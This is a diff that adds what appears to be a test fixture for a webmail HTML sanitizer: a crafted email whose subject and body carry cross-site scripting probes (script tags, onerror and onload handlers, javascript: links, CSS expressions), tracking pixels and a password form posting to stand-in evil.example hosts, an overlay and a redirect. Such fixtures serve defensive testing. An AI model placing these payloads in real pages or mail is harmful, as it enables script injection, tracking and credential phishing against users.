@@ -1,0 +1,20 @@
+From: Mallory <mallory@evil.example>
+To: alice@example.test
+Subject: <script>alert(1)</script> Free money
+Date: Tue, 14 Oct 2026 03:00:00 +0200
+Message-ID: <xss@fixtures.webmail>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head><style>body{background:url("http://tracker.evil.example/css.gif")} p{width:expression(alert(1))}</style></head><body>
+<script>alert('xss')</script>
+<img src="http://tracker.evil.example/pixel.gif?u=alice" width="1" height="1">
+<img src="x" onerror="alert('onerror')">
+<a href="javascript:alert('href')">Click me</a>
+<a href="https://legit.example/login" target="_blank">A normal link</a>
+<iframe src="https://evil.example/frame"></iframe>
+<form action="https://evil.example/phish" method="post"><input name="password" type="password"><button>Login</button></form>
+<svg onload="alert('svg')"></svg>
+<p style="position:fixed;top:0;left:0;width:100%;height:100%;background:white">Overlay</p>
+<meta http-equiv="refresh" content="0;url=https://evil.example">
+</body></html>
